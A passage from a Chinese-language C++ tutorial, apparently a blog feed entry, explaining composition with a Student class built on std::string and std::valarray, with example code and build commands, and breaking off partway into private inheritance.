    
    
    <entry>
      <title>Chapter 14 C++中的代码重用</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_14/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_14/</url>
      
        <content type="html"><![CDATA[<h2 id="14-1-包含对象成员的类"><a href="#14-1-包含对象成员的类" class="headerlink" title="14.1 包含对象成员的类"></a>14.1 包含对象成员的类</h2><p>除了继承 (“is-a” 关系) 之外，C++ 提供了另一种重要的代码重用机制：<strong>包含 (Containment)</strong> 或 <strong>组合 (Composition)**。这种方式模拟的是 **”has-a”</strong> （有一个）关系。</p><p>当一个类（称为<strong>包含类</strong>或<strong>容器类</strong>）将另一个类的对象作为其<strong>成员变量</strong>时，就使用了包含或组合。例如：</p><ul><li>  一辆 <code>Car</code> <strong>有一个</strong> <code>Engine</code>。</li><li>  一个 <code>Person</code> <strong>有一个</strong> <code>Name</code> (可能是 <code>string</code> 对象)。</li><li>  一个 <code>Order</code> <strong>有</strong>一组 <code>OrderItem</code> 对象。</li></ul><p>这种方式允许我们通过组合已有的、功能完善的类来构建更复杂的新类。</p><p>本节我们将设计一个 <code>Student</code> 类，它将包含一个 <code>std::string</code> 对象（表示学生姓名）和一个 <code>std::valarray&lt;double&gt;</code> 对象（表示学生的考试分数）。</p><h3 id="14-1-1-valarray-类简介"><a href="#14-1-1-valarray-类简介" class="headerlink" title="14.1.1 valarray 类简介"></a>14.1.1 valarray 类简介</h3><p><code>valarray</code> 是 C++ 标准库中的一个模板类（定义在 <code>&lt;valarray&gt;</code> 头文件中），专门设计用于简化和优化<strong>数值数组</strong>的操作。它提供了许多方便的功能，例如：</p><ul><li>  <strong>逐元素运算:</strong> 可以直接对整个 <code>valarray</code> 对象执行算术运算（如 <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>），运算会自动应用于每个对应的元素。</li><li>  <strong>数学函数:</strong> 可以将许多标准数学函数（如 <code>sqrt()</code>, <code>abs()</code>, <code>sin()</code>）应用于 <code>valarray</code> 的所有元素。</li><li>  <strong>切片和索引:</strong> 提供灵活的方式来访问和操作数组的子集。</li><li>  <strong>聚合操作:</strong> 内置了计算总和 (<code>sum()</code>)、平均值 (<code>sum()/size()</code>)、最大值 (<code>max()</code>)、最小值 (<code>min()</code>) 等方法。</li></ul><p><strong>简单示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;valarray&gt; // 包含 valarray 头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;   // 用于初始化示例</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; data = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>&#125;;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; <span class="title">v1</span><span class="params">(data.data(), data.size())</span></span>; <span class="comment">// 从 double 数组创建 valarray</span></span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; v2 = &#123;<span class="number">10.0</span>, <span class="number">10.0</span>, <span class="number">10.0</span>, <span class="number">10.0</span>&#125;; <span class="comment">// 使用初始化列表 (C++11)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; <span class="title">v_sum</span><span class="params">(<span class="number">4</span>)</span></span>; <span class="comment">// 创建一个大小为 4 的 valarray</span></span><br><span class="line"></span><br><span class="line">    v_sum = v1 + v2; <span class="comment">// 逐元素相加: v_sum = &#123;11.1, 12.2, 13.3, 14.4&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of elements in v1: &quot;</span> &lt;&lt; v1.sum() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 11</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of v1: &quot;</span> &lt;&lt; v1.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;         <span class="comment">// 输出 4</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Element at index 1 in v_sum: &quot;</span> &lt;&lt; v_sum[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 12.2</span></span><br><span class="line"></span><br><span class="line">    v1 *= <span class="number">2.0</span>; <span class="comment">// 所有元素乘以 2: v1 = &#123;2.2, 4.4, 6.6, 8.8&#125;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">double</span> x : v1) &#123; <span class="comment">// C++11 范围 for 循环</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将使用 <code>valarray&lt;double&gt;</code> 来存储 <code>Student</code> 的多门课成绩。</p><h3 id="14-1-2-Student-类的设计"><a href="#14-1-2-Student-类的设计" class="headerlink" title="14.1.2 Student 类的设计"></a>14.1.2 Student 类的设计</h3><p>我们的 <code>Student</code> 类需要存储姓名和一组分数。</p><ul><li>  <strong>姓名:</strong> 使用 <code>std::string</code> 类。</li><li>  <strong>分数:</strong> 使用 <code>std::valarray&lt;double&gt;</code> 类。</li></ul><p><strong>接口设计:</strong></p><p>我们需要提供方法来：</p><ul><li>  构造 <code>Student</code> 对象（提供姓名和分数）。</li><li>  获取学生的平均分。</li><li>  获取学生的姓名。</li><li>  获取某一门课的分数。</li><li>  输出学生的信息。</li></ul><p><strong>studentc.h (Student 类接口)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STUDENTC_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STUDENTC_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;valarray&gt; // 包含 valarray</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 使用包含（组合）: Student &quot;has-a&quot; string and &quot;has-a&quot; valarray</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;               <span class="comment">// 姓名</span></span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; scores;   <span class="comment">// 分数 (使用 valarray)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 私有方法，用于输出分数</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ostream &amp; <span class="title">arr_out</span><span class="params">(<span class="built_in">std</span>::ostream &amp; os)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    Student() : name(<span class="string">&quot;Null Student&quot;</span>), scores() &#123;&#125; <span class="comment">// 默认构造函数</span></span><br><span class="line">    <span class="comment">// 使用 string 和 valarray 初始化</span></span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">const</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; &amp; a)</span><br><span class="line">        : name(s), scores(a) &#123;&#125;</span><br><span class="line">    <span class="comment">// 使用 string 和 C 风格数组初始化</span></span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">const</span> <span class="keyword">double</span> * pd, <span class="keyword">int</span> n)</span><br><span class="line">        : name(s), scores(pd, n) &#123;&#125; <span class="comment">// valarray 构造函数接受 (指针, 数量)</span></span><br><span class="line">    <span class="comment">// 使用 C 风格字符串和 C 风格数组初始化</span></span><br><span class="line">    Student(<span class="keyword">const</span> <span class="keyword">char</span> * str, <span class="keyword">const</span> <span class="keyword">double</span> * pd, <span class="keyword">int</span> n)</span><br><span class="line">        : name(str), scores(pd, n) &#123;&#125; <span class="comment">// string 和 valarray 构造函数处理转换</span></span><br><span class="line"></span><br><span class="line">    ~Student() &#123;&#125; <span class="comment">// 析构函数 (默认即可，因为 string 和 valarray 会自己管理资源)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问器</span></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">Average</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 计算平均分</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 获取姓名 (返回 const 引用避免复制)</span></span><br><span class="line">    <span class="keyword">double</span> <span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span>; <span class="comment">// 获取第 i 门课分数 (const 版本)</span></span><br><span class="line">    <span class="keyword">double</span> &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i);     <span class="comment">// 获取/设置第 i 门课分数 (非 const 版本)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 友元函数 - 用于输入输出</span></span><br><span class="line">    <span class="comment">// input</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::istream &amp; <span class="keyword">operator</span>&gt;&gt;(<span class="built_in">std</span>::istream &amp; is, Student &amp; stu); <span class="comment">// 读取姓名</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="built_in">std</span>::istream &amp; <span class="title">getline</span><span class="params">(<span class="built_in">std</span>::istream &amp; is, Student &amp; stu)</span></span>;   <span class="comment">// 读取姓名 (整行)</span></span><br><span class="line">    <span class="comment">// output</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Student &amp; stu);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STUDENTC_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>关键点:</strong></p><ul><li><strong>成员初始化列表:</strong> <code>Student</code> 的构造函数使用<strong>成员初始化列表</strong>来初始化 <code>name</code> 和 <code>scores</code> 成员。<ul><li>  <code>name(s)</code>: 调用 <code>std::string</code> 的构造函数（或复制构造函数）来初始化 <code>name</code>。</li><li>  <code>scores(a)</code> 或 <code>scores(pd, n)</code>: 调用 <code>std::valarray&lt;double&gt;</code> 的相应构造函数来初始化 <code>scores</code>。</li></ul></li><li>  <strong>自动资源管理:</strong> 因为 <code>std::string</code> 和 <code>std::valarray</code> 都是设计良好的类，它们会自动管理自己的内存（<code>string</code> 管理字符数据，<code>valarray</code> 管理 <code>double</code> 数据）。因此，<code>Student</code> 类<strong>不需要</strong>显式地编写析构函数、复制构造函数或赋值运算符来处理 <code>name</code> 和 <code>scores</code> 的内存管理（遵循<strong>零法则</strong>）。编译器生成的默认版本会正确地调用 <code>string</code> 和 <code>valarray</code> 的相应特殊成员函数。</li><li>  <strong>接口转发:</strong> <code>Student</code> 类的一些方法（如 <code>operator[]</code>）将操作转发给其成员对象（<code>scores[i]</code>）。</li></ul><h3 id="14-1-3-Student-类示例"><a href="#14-1-3-Student-类示例" class="headerlink" title="14.1.3 Student 类示例"></a>14.1.3 Student 类示例</h3><p><strong>studentc.cpp (Student 类实现)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;studentc.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::ostream;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::istream;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 公有方法实现</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Student::Average</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (scores.size() &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> scores.sum() / scores.size(); <span class="comment">// 使用 valarray 的 sum() 和 size()</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="built_in">string</span> &amp; <span class="title">Student::Name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 [] 访问分数</span></span><br><span class="line"><span class="keyword">double</span> Student::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> scores[i]; <span class="comment">// 调用 valarray 的 operator[]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> &amp; Student::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">return</span> scores[i]; <span class="comment">// 调用 valarray 的 operator[]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 私有方法实现</span></span><br><span class="line"><span class="comment">// 输出分数数组</span></span><br><span class="line"><span class="function">ostream &amp; <span class="title">Student::arr_out</span><span class="params">(ostream &amp; os)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> lim = scores.size();</span><br><span class="line">    <span class="keyword">if</span> (lim &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; lim; i++) &#123;</span><br><span class="line">            os &lt;&lt; scores[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">4</span>) <span class="comment">// 每 5 个换行</span></span><br><span class="line">                os &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">5</span> != <span class="number">0</span>)</span><br><span class="line">            os &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        os &lt;&lt; <span class="string">&quot; empty array &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 友元函数实现</span></span><br><span class="line"><span class="comment">// 使用 &gt;&gt; 读取姓名</span></span><br><span class="line">istream &amp; <span class="keyword">operator</span>&gt;&gt;(istream &amp; is, Student &amp; stu) &#123;</span><br><span class="line">    is &gt;&gt; stu.name; <span class="comment">// 调用 string 的 operator&gt;&gt;</span></span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 getline 读取姓名 (整行)</span></span><br><span class="line"><span class="function">istream &amp; <span class="title">getline</span><span class="params">(istream &amp; is, Student &amp; stu)</span> </span>&#123;</span><br><span class="line">    getline(is, stu.name); <span class="comment">// 调用 string 的 getline</span></span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 &lt;&lt; 输出学生信息</span></span><br><span class="line">ostream &amp; <span class="keyword">operator</span>&lt;&lt;(ostream &amp; os, <span class="keyword">const</span> Student &amp; stu) &#123;</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Scores for &quot;</span> &lt;&lt; stu.name &lt;&lt; <span class="string">&quot;:\n&quot;</span>;</span><br><span class="line">    stu.arr_out(os); <span class="comment">// 使用私有方法输出分数</span></span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>use_stuc.cpp (使用 Student 类)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;studentc.h&quot;</span> <span class="comment">// 包含 Student 类定义</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(Student &amp; sa, <span class="keyword">int</span> n)</span></span>; <span class="comment">// 函数原型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> pupils = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> quizzes = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Student ada[pupils] = &#123; <span class="comment">// 创建 Student 对象数组</span></span><br><span class="line">        Student(quizzes), Student(quizzes), Student(quizzes) <span class="comment">// 假设有 Student(int n) 构造函数</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 假设 studentc.h/cpp 已修改，添加构造函数 Student(int n)</span></span><br><span class="line">    <span class="comment">// Student::Student(int n) : name(&quot;Nully&quot;), scores(n) &#123;&#125; // 示例构造函数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果没有 Student(int n)，则需要这样创建：</span></span><br><span class="line">    <span class="comment">// double sample_scores[quizzes] = &#123;0.0&#125;; // 示例分数</span></span><br><span class="line">    <span class="comment">// Student ada[pupils] = &#123;</span></span><br><span class="line">    <span class="comment">//     Student(&quot;Default1&quot;, sample_scores, quizzes),</span></span><br><span class="line">    <span class="comment">//     Student(&quot;Default2&quot;, sample_scores, quizzes),</span></span><br><span class="line">    <span class="comment">//     Student(&quot;Default3&quot;, sample_scores, quizzes)</span></span><br><span class="line">    <span class="comment">// &#125;;</span></span><br><span class="line">    <span class="comment">// 为了编译通过，我们假设 Student(int n) 存在</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i)</span><br><span class="line">        <span class="built_in">set</span>(ada[i], quizzes); <span class="comment">// 设置学生数据</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nStudent List:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ada[i].Name() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 输出姓名</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nResults:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; ada[i]; <span class="comment">// 输出完整信息 (调用 operator&lt;&lt;)</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;average: &quot;</span> &lt;&lt; ada[i].Average() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 输出平均分</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：设置学生姓名和分数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(Student &amp; sa, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter the student&#x27;s name: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">cin</span>, sa); <span class="comment">// 使用友元 getline 读取姓名</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; quiz scores:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; sa[i]; <span class="comment">// 使用 operator[] 设置分数</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>.get() != <span class="string">&#x27;\n&#x27;</span>) <span class="comment">// 清除输入缓冲区</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 需要修改 studentc.h/cpp 添加 Student(int n) 构造函数 ---</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// studentc.h 添加:</span></span><br><span class="line"><span class="comment">    explicit Student(int n) : name(&quot;Nully&quot;), scores(n) &#123;&#125; // explicit 防止意外转换</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// studentc.cpp 不需要额外添加，因为初始化列表已完成工作</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>编译和运行:</strong></p><p>你需要将 <code>studentc.cpp</code> 和 <code>use_stuc.cpp</code> 一起编译链接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 假设 studentc.h/cpp 已添加 Student(int n) 构造函数</span></span><br><span class="line">g++ use_stuc.cpp studentc.cpp -o use_stuc</span><br><span class="line">./use_stuc</span><br></pre></td></tr></table></figure><p>程序会提示输入每个学生的名字和分数，然后显示学生列表和每个学生的详细信息及平均分。</p><p><strong>总结:</strong></p><ul><li>  <strong>包含 (组合)</strong> 是通过将一个类的对象作为另一个类的成员来实现的，模拟 <strong>“has-a”</strong> 关系。</li><li>  这是代码重用的重要方式，允许利用现有类的功能。</li><li>  包含类的构造函数通常使用<strong>成员初始化列表</strong>来调用成员对象的构造函数。</li><li>  如果成员对象能正确管理自己的资源（如 <code>std::string</code>, <code>std::valarray</code>, 智能指针），包含类通常不需要自定义析构函数、复制/移动操作（<strong>零法则</strong>）。</li><li>  包含类可以通过其成员对象的公有接口来使用它们的功能。</li></ul><h2 id="14-2-私有继承"><a href="#14-2-私有继承" class="headerlink" title="14.2 私有继承"></a>14.2 私有继承</h2><p>除了公有继承 (<code>public</code>) 模拟 “is-a” 关系外，C++ 还提供了<strong>私有继承 (<code>private</code>)**。私有继承模拟的是 **”has-a”</strong> 或更准确地说是 <strong>“is-implemented-in-terms-of”</strong> （根据…来实现）的关系。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DerivedClassName</span> :</span> <span class="keyword">private</span> BaseClassName &#123;</span><br><span class="line">    <span class="comment">// ... 派生类成员 ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><em>默认的继承方式（如果省略访问说明符）也是 <code>private</code> (对于 <code>class</code>)。</em></p><p><strong>访问规则:</strong></p><p>当一个类私有继承自基类时：</p><ul><li>  基类的 <code>public</code> 成员在派生类中变为 **<code>private</code>**。</li><li>  基类的 <code>protected</code> 成员在派生类中变为 **<code>private</code>**。</li><li>  基类的 <code>private</code> 